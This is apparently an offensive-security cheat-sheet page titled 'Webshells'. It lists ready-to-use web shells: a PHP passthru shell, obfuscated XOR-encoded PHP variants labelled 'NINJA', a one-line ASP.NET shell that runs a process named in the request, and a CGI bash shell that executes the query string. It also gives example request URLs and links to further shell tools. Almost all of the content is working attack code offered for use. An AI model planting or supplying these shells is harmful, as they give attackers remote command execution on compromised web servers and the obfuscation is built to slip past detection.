# Webshells

{% embed url="https://www.localroot.net/" %}

## **PHP**

```php
# system

//CURL http://ip/shell.php?1=whoami
//www.somewebsite.com/index.html?1=ipconfig

// passthru 
<?php passthru($_GET['cmd']); ?>

// NINJA
;").($_^"/"); ?> 
http://target.com/path/to/shell.php?=function&=argument
http://target.com/path/to/shell.php?=system&=ls

// NINJA 2
/'^'{{{{';@${$_}[_](@${$_}[__]);

// One more
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>

// https://github.com/Arrexel/phpbash
// https://github.com/flozz/p0wny-shell
```

## **.NET**

```aspnet
<%@Page Language=”C#”%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[“c”],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>
www.somewebsite.com/cgi-bin/a?ls%20/var
```

## **Bash**

```bash
#!/bin/sh
echo;$_ `${QUERY_STRING/%20/ }`
www.somewebsite.com/cgi-bin/a?ls%20/var
```

## aspx

```bash
# https://github.com/antonioCoco/SharPyShell
```

